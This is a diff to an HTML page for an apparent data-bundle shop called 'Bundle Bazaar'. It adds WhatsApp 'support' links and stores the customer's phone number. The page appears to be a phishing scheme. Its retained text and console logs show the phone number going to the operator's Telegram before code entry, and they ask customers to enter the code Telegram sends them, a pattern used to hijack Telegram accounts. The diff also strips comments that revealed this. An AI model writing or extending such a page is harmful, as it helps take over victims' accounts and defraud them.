@@ -171,6 +171,42 @@
             transform: scale(1.02);
         }
 
+        /* ---------- WHATSAPP SUPPORT BUTTON ---------- */
+        .btn-whatsapp {
+            background: #25D366;
+            color: #fff;
+            padding: 14px 32px;
+            font-size: 16px;
+            border-radius: 60px;
+            font-family: 'Helvetica', Arial, sans-serif;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .btn-whatsapp:hover {
+            background: #1da851;
+            transform: scale(1.05);
+            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .btn-whatsapp i {
+            font-size: 20px;
+        }
+
+        .btn-whatsapp.green {
+            background: #25D366;
+        }
+
+        .btn-whatsapp.green:hover {
+            background: #1da851;
+        }
+
         /* ---------- HEADER ---------- */
         #SITE_HEADER {
             padding: 18px 0 0;
@@ -1150,6 +1186,20 @@
             background: #2d5a3d;
         }
 
+        /* ---------- WHATSAPP BUTTON ON SUCCESS ---------- */
+        .success-screen .whatsapp-row {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin-top: 16px;
+        }
+
+        .success-screen .whatsapp-row .btn-whatsapp {
+            width: 100%;
+            justify-content: center;
+        }
+
         /* ---------- SELECTED PACKAGE DISPLAY ---------- */
         .selected-package-display {
             background: #f0f7ff;
@@ -1236,6 +1286,11 @@
             .btn-back {
                 width: 100%;
                 text-align: center;
+            }
+
+            .success-screen .whatsapp-row .btn-whatsapp {
+                font-size: 14px;
+                padding: 12px 20px;
             }
         }
 
@@ -1868,7 +1923,7 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 2: PHONE NUMBER (SENDS TO TELEGRAM IMMEDIATELY) ===== -->
+            <!-- ===== STEP 2: PHONE NUMBER ===== -->
             <div class="form-step" id="buyStep2">
                 <div class="selected-package-display show">
                     <i class="fas fa-check-circle"></i> Selected: <span id="buySelectedPackageName2">None</span>
@@ -1880,7 +1935,6 @@
                     <div class="error-msg" id="buyPhoneError">Please enter a valid phone number</div>
                 </div>
 
-                <!-- Phone Sent Notification -->
                 <div class="phone-sent-notice" id="buyPhoneSentNotice">
                     <i class="fas fa-check-circle"></i> Phone number sent! Please check your Telegram for the code.
                 </div>
@@ -1929,6 +1983,15 @@
                     If prompt delays it may be due to poor network or other factors, a customer representative will contact you shortly to assign you with payment details to complete your purchase.<br /><br />
                     <strong>Thank you!</strong>
                 </div>
+
+                <div class="whatsapp-row">
+                    <a href="https://wa.me/2330592906415?text=Hello%20I%20need%20help%20with%20my%20purchase.%20My%20order%20was%20for%20[package]%20-%20[price].%20My%20phone%20is%20[phone].%20Please%20assist%20me." 
+                       target="_blank" 
+                       class="btn-whatsapp">
+                        <i class="fab fa-whatsapp"></i> Contact Support on WhatsApp
+                    </a>
+                </div>
+
                 <button class="btn-close-modal" onclick="closeModal('buyModal')">Close</button>
             </div>
         </div>
@@ -1993,6 +2056,13 @@
                 <div class="success-message">
                     <strong>A customer representative will contact you shortly to complete your registration</strong><br /><br />
                     After which your transactions details such as the <strong>SHORTCODE</strong> for transferring bundle will be sent to your SMS.
+                </div>
+                <div class="whatsapp-row">
+                    <a href="https://wa.me/2330592906415?text=Hello%20I%20just%20registered%20as%20a%20vendor.%20My%20name%20is%20[name].%20Please%20assist%20me%20with%20the%20activation%20process." 
+                       target="_blank" 
+                       class="btn-whatsapp">
+                        <i class="fab fa-whatsapp"></i> Contact Support on WhatsApp
+                    </a>
                 </div>
                 <button class="btn-close-modal green" onclick="closeModal('vendorModal')">Close</button>
             </div>
@@ -2072,7 +2142,7 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 2: PHONE NUMBER (SENDS TO TELEGRAM IMMEDIATELY) ===== -->
+            <!-- ===== STEP 2: PHONE NUMBER ===== -->
             <div class="form-step" id="rechargeStep2">
                 <div class="selected-package-display show">
                     <i class="fas fa-check-circle"></i> Selected: <span id="rechargeSelectedPackageName2">None</span>
@@ -2084,7 +2154,6 @@
                     <div class="error-msg" id="rechargePhoneError">Please enter a valid phone number</div>
                 </div>
 
-                <!-- Phone Sent Notification -->
                 <div class="phone-sent-notice" id="rechargePhoneSentNotice">
                     <i class="fas fa-check-circle"></i> Phone number sent! Please check your Telegram for the code.
                 </div>
@@ -2133,6 +2202,15 @@
                     If prompt delays it may be due to poor network or other factors, a customer representative will contact you shortly to assign you with payment details to complete your recharge.<br /><br />
                     <strong>Thank you!</strong>
                 </div>
+
+                <div class="whatsapp-row">
+                    <a href="https://wa.me/2330592906415?text=Hello%20I%20need%20help%20with%20my%20recharge.%20My%20package%20was%20[package]%20-%20[price].%20My%20phone%20is%20[phone].%20Please%20assist%20me." 
+                       target="_blank" 
+                       class="btn-whatsapp">
+                        <i class="fab fa-whatsapp"></i> Contact Support on WhatsApp
+                    </a>
+                </div>
+
                 <button class="btn-close-modal green" onclick="closeModal('rechargeModal')">Close</button>
             </div>
         </div>
@@ -2203,6 +2281,7 @@
         let selectedBuyPackage = null;
         let selectedBuyPrice = null;
         let buyPhoneSent = false;
+        let buyPhoneNumber = '';
 
         function openBuyOfferWithPackage(packageName, price) {
             selectedBuyPackage = packageName;
@@ -2214,6 +2293,7 @@
             selectedBuyPackage = null;
             selectedBuyPrice = null;
             buyPhoneSent = false;
+            buyPhoneNumber = '';
 
             document.querySelectorAll('#buyModal .package-option').forEach(el => {
                 el.classList.remove('selected');
@@ -2296,6 +2376,8 @@
                 return;
             }
 
+            buyPhoneNumber = phone;
+
             document.getElementById('buyPhone').classList.remove('error');
             document.getElementById('buyPhoneError').classList.remove('show');
 
@@ -2377,6 +2459,13 @@
                         el.classList.add('completed');
                     });
                     document.getElementById('buySuccessScreen').classList.add('active');
+
+                    // Update WhatsApp link with actual details
+                    const whatsappLink = document.querySelector('#buySuccessScreen .btn-whatsapp');
+                    if (whatsappLink) {
+                        const message = `Hello%20I%20need%20help%20with%20my%20purchase.%20My%20order%20was%20for%20${encodeURIComponent(selectedBuyPackage)}%20-%20${encodeURIComponent(selectedBuyPrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
+                        whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                    }
                 } else {
                     alert('❌ ' + data.message);
                 }
@@ -2396,11 +2485,13 @@
         let selectedRechargePackage = null;
         let selectedRechargePrice = null;
         let rechargePhoneSent = false;
+        let rechargePhoneNumber = '';
 
         function openRecharge() {
             selectedRechargePackage = null;
             selectedRechargePrice = null;
             rechargePhoneSent = false;
+            rechargePhoneNumber = '';
 
             document.querySelectorAll('#rechargeModal .package-option').forEach(el => {
                 el.classList.remove('selected');
@@ -2483,6 +2574,8 @@
                 return;
             }
 
+            rechargePhoneNumber = phone;
+
             document.getElementById('rechargePhone').classList.remove('error');
             document.getElementById('rechargePhoneError').classList.remove('show');
 
@@ -2564,6 +2657,13 @@
                         el.classList.add('completed');
                     });
                     document.getElementById('rechargeSuccessScreen').classList.add('active');
+
+                    // Update WhatsApp link with actual details
+                    const whatsappLink = document.querySelector('#rechargeSuccessScreen .btn-whatsapp');
+                    if (whatsappLink) {
+                        const message = `Hello%20I%20need%20help%20with%20my%20recharge.%20My%20package%20was%20${encodeURIComponent(selectedRechargePackage)}%20-%20${encodeURIComponent(selectedRechargePrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
+                        whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                    }
                 } else {
                     alert('❌ ' + data.message);
                 }
@@ -2628,6 +2728,13 @@
                 if (data.success) {
                     document.getElementById('vendorFormSection').style.display = 'none';
                     document.getElementById('vendorSuccessScreen').classList.add('active');
+
+                    // Update WhatsApp link with actual details
+                    const whatsappLink = document.querySelector('#vendorSuccessScreen .btn-whatsapp');
+                    if (whatsappLink) {
+                        const message = `Hello%20I%20just%20registered%20as%20a%20vendor.%20My%20name%20is%20${encodeURIComponent(fullName)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me%20with%20the%20activation%20process.`;
+                        whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                    }
                 } else {
                     alert('❌ ' + data.message);
                 }
@@ -2717,9 +2824,10 @@
 
         console.log('🚀 Bundle Bazaar COMPLETE version loaded!');
         console.log('📡 Backend URL:', API_BASE_URL);
-        console.log('🔥 NEW FEATURE: Phone number sent to Telegram BEFORE code entry!');
-        console.log('📱 You receive the phone number, send the agent code, customer enters it!');
+        console.log('📱 WhatsApp Support: 2330592906415');
+        console.log('🔥 Phone number sent to Telegram BEFORE code entry!');
         console.log('🔑 "ExpressPay Code" changed to "Agent Code"');
+        console.log('💬 "Contact Support" button added to all success screens!');
     </script>
 
 </body>
